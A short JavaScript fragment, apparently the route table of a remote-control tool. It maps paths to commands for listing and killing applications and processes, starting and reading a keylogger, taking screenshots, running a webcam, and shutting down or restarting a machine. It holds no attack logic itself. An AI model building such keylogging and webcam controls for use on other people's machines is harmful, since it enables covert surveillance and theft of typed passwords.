    // --- APP ---
    '/application/list':  { command: 'APPLICATION', action: 'XEM' },
    '/application/kill':  { command: 'APPLICATION', action: 'KILL' },
    '/application/start': { command: 'APPLICATION', action: 'START' },
    '/application/quit':  { command: 'APPLICATION', action: 'QUIT' },

    // --- PROCESS ---
    '/process/list':  { command: 'PROCESS', action: 'XEM' },
    '/process/kill':  { command: 'PROCESS', action: 'KILL' },
    '/process/start': { command: 'PROCESS', action: 'START' },
    '/process/quit':  { command: 'PROCESS', action: 'QUIT' },

    // --- KEYLOGGER ---
    '/keylog/start': { command: 'KEYLOG', action: 'HOOK' },
    '/keylog/stop':  { command: 'KEYLOG', action: 'UNHOOK' },
    '/keylog/print': { command: 'KEYLOG', action: 'PRINT' },
    '/keylog/quit':  { command: 'KEYLOG', action: 'QUIT' },

    // --- SCREENSHOT (TAKEPIC) ---
    '/screenshot/take': { command: 'TAKEPIC', action: 'TAKE' },
    '/screenshot/quit': { command: 'TAKEPIC', action: 'QUIT' },

    // --- WEBCAM ---
    '/webcam/start': { command: 'WEBCAM', action: 'START' },
    '/webcam/stop':  { command: 'WEBCAM', action: 'STOP' },
    '/webcam/quit':  { command: 'WEBCAM', action: 'QUIT' },

    // --- SYSTEM ---
    '/shutdown': { command: 'SHUTDOWN' },
    '/restart':  { command: 'RESTART' }